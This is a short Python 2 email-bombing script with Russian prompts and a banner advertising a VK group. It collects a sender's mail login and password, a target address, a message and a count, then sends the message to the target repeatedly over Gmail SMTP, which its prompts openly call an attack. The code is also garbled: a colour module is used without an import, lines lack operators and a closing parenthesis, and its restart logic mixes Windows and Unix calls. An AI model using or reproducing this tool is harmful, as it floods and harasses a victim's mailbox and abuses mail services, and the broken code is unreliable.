#!/usr/local/bin/python
import smtplib, getpass, os, sys, subprocess
flag=(Fore.GREEN + '''
88888888888888
8888888    888
88   88    888
88   88  88888
88   88  88888
88   888888888
88       88888
88888888888888
88888888888888''')
print(flag)
chel=(Fore.RED + """
Наш паблик вк v̲k̲.c̲o̲m̲/p̲r̲o̲g̲t̲e̲a̲m̲l̲u̲b̲
ЦЕЛЬ 1̲0̲0̲ САБОВ! Мы вас любим♡♡♡""")
print(chel)
amount = 1
fromemail = "example@example.com"
username = "example@example.com"
password = "password"
smtpserver = '"smtp.gmail.com:587"'
fromemail = raw_input("Напишите email с которого будит производиться аттака\n" Fore.BLUE + "☆-->")
print ("Пароль от почты с которой будет производитса аттака(она не будет сохронена!)\n" + Fore.RED + "☆-->")
password = getpass.getpass()
smtpserver = raw_input("Enter smtpserver, googles is: smtp.gmail.com:587: ")
toemail = raw_input("Почта на которую будит производитса аттака\n" + Fore.GREEN + "-->"
message = raw_input("Сообщения которое будит отпровлятса на почту которая аттакуетсая\n" + Fore.BLUE + "-->")
amount = raw_input("Напиши скоко сообщений отправить\n" + Fore.GREEN + "-->")
#insert more here

#send function VVV
server=smtplib.SMTP(smtpserver)
server.starttls()
server.login(fromemail, password)
server.sendmail(fromemail, toemail, message)
print "Sending "+amount+" emails"
i = 1
while i < int(amount):
    print(i)
    server.sendmail(fromemail, toemail, message)
    i = i+1
server.quit()
pause = raw_input("Нажмите Enter чтобы перезапустить программу. Нажмите Ctrl + z чтоб выйти!")
os.startfile("EmailSpammerNoGui.py")
os.system('kill $PPID')
